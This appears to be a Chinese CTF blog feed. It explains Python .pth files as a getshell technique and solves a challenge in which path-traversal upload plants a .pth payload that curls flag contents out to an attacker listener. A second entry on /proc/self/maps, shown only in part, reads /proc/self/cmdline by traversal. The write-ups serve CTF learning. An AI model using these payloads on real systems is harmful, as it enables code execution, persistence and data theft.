    <link href="/2023/08/24/pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/"/>
    <url>/2023/08/24/pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</url>
    
    <content type="html"><![CDATA[<h2 id="python-pth文件写入getshell"><a href="#python-pth文件写入getshell" class="headerlink" title="[python]pth文件写入getshell"></a>[python]pth文件写入getshell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><p>在讲之前我们先要了解一下python中<strong>site模块</strong>的作用</p><blockquote><p>site —— 指定域的配置钩子</p></blockquote><p><strong>site模块会在初始化时自动导入</strong>,导入此模块将会<strong>附加域特定的路径到模块搜索路径</strong>并且添加一些内建对象</p><blockquote><p>它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 <code>sys.prefix</code> 和 <code>sys.exec_prefix</code>；空的头部会被跳过。 对于尾部，它会使用空字符串然后是 <code>lib/site-packages</code> (在 Windows 上) 或 <code>lib/python*X.Y*/site-packages</code> (在 Unix 和 macOS 上)。 对于每个不同的头-尾组合，它会<strong>查看其是否指向现有的目录，如果是的话，则将其添加到 <code>sys.path</code> 并且检查新添加目录中的配置文件。</strong></p></blockquote><p>一个路径配置文件是具有 <code>name.pth</code> 命名格式的文件，并且存在上面提到的四个目录之一中；它的内容是要<strong>添加到 <code>sys.path</code> 中的额外项目</strong>（每行一个）。不存在的项目不会添加到 <code>sys.path</code>，并且不会检查项目指向的是目录还是文件。项目不会被添加到 <code>sys.path</code> 超过一次。空行和由 <code>#</code> 起始的行会被跳过。</p><p>每次启动 Python，在 <code>.pth</code> 文件中的可执行行都将会被运行</p><p><strong>以 <code>import</code> 开始的行（跟着空格或 TAB）会被执行。</strong></p></blockquote><p>简单的说：</p><blockquote><p>python 的 site 模块支持 “Site-specific configuration hook” 的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入。<br><code>sys.prefix</code> 和 <code>sys.exec_prefix</code> 在 <code>C:/Python</code>，那么创建路径为 <code>C:\Python\Lib\site-packages\1.pth</code> 的 pth 文件，然后其内容为<br><code>c:/windows/temp/</code><br>那么在新的 python 进程中，temp 路径将被添加到 sys.path 中</p></blockquote><p>当我们在系统python的<code>sys.prefix</code>、<code>sys.exec_prefix</code>路径下的<code>site-packages</code>中写入的1个pth文件的话，每次运行python的时候，会自动将该<strong>文件内容存在的指定路径导入到模块搜索路径</strong>，</p><p>如果pth文件是以<code>import</code>开头的，并且代码是写在一行的话，那么这一行可以被当作python<strong>代码</strong>执行</p><p>这里就可以通过上传文件到sys.prefix中的<code>site-packages</code>下，然后后续启动代码触发命令执行</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>我们做个实验：</p><p><img src="https://s2.loli.net/2023/05/27/qmhoEOtr6W4ig5X.png" alt="image-20230527153444224"></p><p>在kali中我的 <code>pth</code>文件存放在 <code>/usr/local/lib/python3.10/dist-packages</code> 下</p><p>于是我们写一个 1.pth 于该目录。内容为： <code>/tmp</code></p><p><img src="https://s2.loli.net/2023/05/27/TXEhMqbCJn5vzpS.png" alt="image-20230527153630444"></p><p>然后我们使用 <code>sys.path</code>查看：</p><blockquote><p>在 Python 中，<code>sys.path</code>是一个列表，用于指定模块搜索路径。当Python导入模块时，解释器会按照以下顺序搜索模块：</p><ol><li>当前目录。</li><li>环境变量 PYTHONPATH 指定的目录。</li><li>标准库安装路径下的目录。</li></ol><p>在这三个搜索路径中找不到模块时，Python会引发“ModuleNotFoundError”异常。但是，我们可以在运行时修改<code>sys.path</code>，以便在搜索路径中添加自定义目录或修改默认搜索路径。</p></blockquote><p><img src="https://s2.loli.net/2023/05/27/navHm4h6wS5lqGb.png" alt="image-20230527153855985"></p><p>我们发现 <code>/tmp</code> 路径已经被添加进<code>模块搜索路径</code>了，因为每次启动python的会加载site模块，从而加载相关pth文件</p><p>接着我们尝试将<code>pth</code>文件内容改为：(需要写在1行) 去读根目录下的flag文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&#x27;cat /fl*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>然后我们运行python：</p><p><img src="https://s2.loli.net/2023/05/27/1nBhxDiZytaP7Vc.png" alt="image-20230527154506803"></p><p>成功命令执行</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在site模块的site.py中有如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;#&quot;</span>):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> line.strip() == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line.startswith((<span class="hljs-string">&quot;import &quot;</span>, <span class="hljs-string">&quot;import\t&quot;</span>)):<br>            <span class="hljs-built_in">exec</span>(line)<br>            <span class="hljs-keyword">continue</span><br>        line = line.rstrip()<br>        <span class="hljs-built_in">dir</span>, dircase = makepath(sitedir, line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dircase <span class="hljs-keyword">in</span> known_paths <span class="hljs-keyword">and</span> os.path.exists(<span class="hljs-built_in">dir</span>):<br>            sys.path.append(<span class="hljs-built_in">dir</span>)<br>            known_paths.add(dircase)<br></code></pre></td></tr></table></figure><p>当<code>pth</code>文件以 <code>import </code>  、<code>import\t </code> 开头时，会将这一行进行命令执行，因此，如果pth内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>每个新启动的进程都会运行该代码，执行calc命令</p><p>（因为site模块初始化时被加载，并且hook <code>pth</code>文件到<code>模块搜索路径</code>）</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><blockquote><p>在Python中，<code>site.addpackage()</code>是一个函数，用于将自定义包添加到Python解释器的系统路径和缓存目录中。</p><p>当我们使用Python解释器执行脚本或启动交互式Shell时，Python解释器会加载默认的模块搜索路径列表。而使用<code>site.addpackage()</code>函数，我们可以为Python解释器添加自定义模块路径，以便让解释器能够找到我们自己创建的包。</p><p><code>site.addpackage()</code>函数的语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">site.addpackage(fullpath, set_readable=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>其中，<code>fullpath</code>参数是要添加的包的完整路径，<code>set_readable</code>参数表示是否将该包标记为可读写。</p><p>例如，假设我们创建了名为“my_package”的包，并将其保存在路径<code>/path/to/my_package</code>下。我们可以使用以下代码将“my_package”添加到Python解释器的搜索路径中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> site<br><br><span class="hljs-comment"># 添加my_package到Python解释器的搜索路径中</span><br>site.addpackage(<span class="hljs-string">&#x27;/path/to/my_package&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这样，当我们尝试导入“my_package”模块时，Python解释器将在<code>/path/to/my_package</code>目录下寻找模块，并可以正确地导入我们的自定义包。</p><p>需要注意的是，<code>site.addpackage()</code>只能添加包的路径，而无法加载包中的模块。我们仍然需要使用<code>import</code>来导入包中的模块。</p></blockquote><p>当我们使用 <code>site.addpackage()</code> 函数，并且路径是已知的</p><p><strong>我们可以通过上传pth文件到该路径，进行getshell</strong></p><h4 id="例题：-闽盾杯-pypth"><a href="#例题：-闽盾杯-pypth" class="headerlink" title="例题： [闽盾杯]pypth"></a>例题： [闽盾杯]pypth</h4><p>目录结构：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|--app.py</span><br><span class="hljs-string">|--static</span><br><span class="hljs-string">|--index.html</span><br></code></pre></td></tr></table></figure><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> site<br><br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> app.send_static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    f = request.files[<span class="hljs-string">&quot;data&quot;</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> destination:<br>        destination.write(f.read())<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;File is uploaded!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/install&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">install</span>():<br>    package_name = request.args.get(<span class="hljs-string">&#x27;package_name&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> package_name:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Not allowed!&quot;</span>, <span class="hljs-number">400</span>)<br><br>    src = os.path.join(<span class="hljs-string">&#x27;contrib&#x27;</span>, <span class="hljs-string">&#x27;packages&#x27;</span>, package_name)<br>    dst = os.path.join(<span class="hljs-string">&#x27;/tmp/extract&#x27;</span>, package_name)<br><br>    shutil.copy(src, dst)<br>    shutil.unpack_archive(dst, extract_dir=<span class="hljs-string">&#x27;/tmp/extract&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Installed!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/clean&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean</span>():<br>    file = os.path.basename(request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>))<br>    file_safe = <span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;file&#125;</span>&#x27;</span><br>    os.unlink(file_safe)<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;file removed!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    site_dir = <span class="hljs-string">&quot;/tmp/extract&quot;</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    site.addpackage(site_dir, name, <span class="hljs-literal">None</span>)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>File Upload and Package Installation<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>File Upload Form<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Upload File<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Package Installation Form<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/install&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;package-name&quot;</span>&gt;</span>Package Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;package_name&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;package-name&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Install Package<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Clean up Uploaded Files<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/clean&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>File Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Remove File<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Add Package to Site Directory<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>Package Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Add Package<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>简单分析一下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    f = request.files[<span class="hljs-string">&quot;data&quot;</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> destination:<br>        destination.write(f.read())<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;File is uploaded!&quot;</span>, <span class="hljs-number">200</span>)<br><br>...<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    site_dir = <span class="hljs-string">&quot;/tmp/extract&quot;</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    site.addpackage(site_dir, name, <span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>在文件上传这里是将上传文件存储到 <code>/tmp/storage</code> 目录下，但是这里没有限制，存在<strong>目录穿越漏洞</strong></p><p>所以我们可以上传文件名：<code>../extract/1.pth</code>，内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.popen(<span class="hljs-string">&#x27;curl http://192.168.56.128:9000?a=`cat /f*`&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>这样在 add路由 我们就会将 <code>/tmp/extract</code> 目录下面的 <code>1.pth</code> 添加到 <code>模块搜索路径</code> 中</p><p>当执行python时，就会执行命令</p><p><strong>步骤：</strong></p><p>我们上传一个文件： <code>../extract/1.pth</code></p><p><img src="https://s2.loli.net/2023/05/27/IuNvyOlFWnbox1D.png" alt="image-20230527161530186"></p><p>然后在虚拟机开启监听9000端口：</p><p><img src="https://s2.loli.net/2023/05/27/yhsLS1CUDQ8ENgf.png" alt="image-20230527161611275"></p><p>接着我们点击 add 添加模块</p><p><img src="https://s2.loli.net/2023/05/27/EZ1S9boDIUfimBz.png" alt="image-20230527161638748"></p><p>成功把flag外带出来：</p><p><img src="https://s2.loli.net/2023/05/27/JRzauMpoW2ylFh7.png" alt="image-20230527161729793"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://docs.python.org/zh-cn/3/library/site.html">site-指定域配置钩子</a></p><p><a href="https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/">Code Execution via Site-Specific Configuration Hooks</a></p><p><a href="https://www.cnblogs.com/Nestar/p/17336664.html">Python pth 文件写入 getshell 或权限维持</a></p><p><a href="https://y4er.com/posts/python-pth-file-write-getshell/">Python pth文件写入getshell</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pth文件写入getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proc目录self下的maps&amp;&amp;mem</title>
    <link href="/2023/08/24/proc%E7%9B%AE%E5%BD%95self%E4%B8%8B%E7%9A%84maps&amp;&amp;mem/"/>
    <url>/2023/08/24/proc%E7%9B%AE%E5%BD%95self%E4%B8%8B%E7%9A%84maps&amp;&amp;mem/</url>
    
    <content type="html"><![CDATA[<h2 id="proc-self-maps-proc-self-mem"><a href="#proc-self-maps-proc-self-mem" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem"></a>&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps<strong>是一个特殊文件，它</strong>提供了当前进程的内存映射信息。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，**&#x2F;proc&#x2F;self&#x2F;maps实际上指向了当前进程的内存映射信息。**</p><p>该文件包含了当前进程的内存映射区域的详细信息，包括<strong>起始地址、结束地址、访问权限、偏移量、设备号、文件路径</strong>等。每一行对应于一个内存映射区域，</p><p><img src="https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png" alt="image-20230525021902703"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">55bac9dcb000</span>-<span class="hljs-number">55</span>bac9dcd000 r--p <span class="hljs-number">00000000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01</span> <span class="hljs-number">533672</span>                     /usr/bin/cat <br></code></pre></td></tr></table></figure><p>代表什么意思</p><ul><li><code>55bac9dcb000-55bac9dcd000</code>: 这是内存区域的起始地址和结束地址。该区域从0x55bac9dcb000到0x55bac9dcd000。</li><li><code>r--p</code>: 这表示内存区域的访问权限。在这种情况下，该区域只允许读取（read）操作。</li><li><code>00000000</code>: 这是该内存区域在文件中的偏移量。在这种情况下，偏移量为0。</li><li><code>08:01</code>: 这是指与该内存区域相关联的设备号和节点号。设备号为08，节点号为01。</li><li><code>/usr/bin/cat</code>: 这是映射到该内存区域的文件的路径。在这种情况下，该区域是由<code>/usr/bin/cat</code>文件映射而来。</li></ul><p>综上所述，该行表示了一个只读权限的内存区域，它是由<code>/usr/bin/cat</code>文件映射而来。</p></blockquote><p>根据上面的描述， <code>/proc/self/maps</code>记录了当前进程的内存映射的相关信息，根据这些信息我们可以找到对应的内存空间</p><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;mem<strong>是一个特殊文件，它提供了</strong>对当前进程内存的直接访问。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，&#x2F;proc&#x2F;self&#x2F;mem实际上指向了当前进程的内存。</p><p>通过读取和写入&#x2F;proc&#x2F;self&#x2F;mem文件，可以直接对当前进程的内存进行操作。这包括读取和修改进程的内存内容，可以用于调试、分析或修改进程的运行时状态。</p><p>但是需要注意的是，&#x2F;proc&#x2F;self&#x2F;mem文件的访问权限通常非常受限制。只有具有足够权限的用户或特权进程才能访问该文件。此外，对于一个普通的应用程序来说，直接读取或写入&#x2F;proc&#x2F;self&#x2F;mem文件通常是不必要且危险的操作。</p></blockquote><p>我们也知道了 <code>/proc/self/mem</code> 文件 ，可以对当前进程内存进行访问。</p><p>总结一下，就是根据 <code>/proc/self/maps</code>提供的内存地址映射信息找到 <code>/proc/self/mem</code>相应的内存块</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="Cute-Cirno-Cute-Cirno-Revenge"><a href="#Cute-Cirno-Cute-Cirno-Revenge" class="headerlink" title="Cute Cirno &amp; Cute Cirno (Revenge)"></a>Cute Cirno &amp; Cute Cirno (Revenge)</h4><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>首先查看源码：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png" alt="image-20230525015929206" style="zoom:33%;" /><p>发现一个读文件的路由，根据数据包可知，这是python编写的</p><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;cmdline<strong>是一个特殊的文件，它</strong>提供了当前进程的命令行参数信息。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。**&#x2F;proc&#x2F;self是一个符号链接，它指向当前正在执行的进程的目录<strong>。因此，</strong>&#x2F;proc&#x2F;self&#x2F;cmdline实际上指向了当前进程的命令行参数信息。**</p></blockquote><p>我们读取 <code>/proc/self/cmdline</code> 获取命令行信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>neepusec.fun:<span class="hljs-number">28912</span><span class="hljs-regexp">/r3aDF1le?filename=../</span>..<span class="hljs-regexp">/../</span>proc<span class="hljs-regexp">/self/</span>cmdline<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png" alt="image-20230525020423295"></p><p>返回了一个文件路径，有一个<code>CuteCirno.py</code>文件</p><p>当我们访问一个不存在的路径时</p><p><img src="https://s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png" alt="image-20230525020627713"></p><p>我们发现报错了，于是读取这两个文件：</p><p>CuteCirno.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 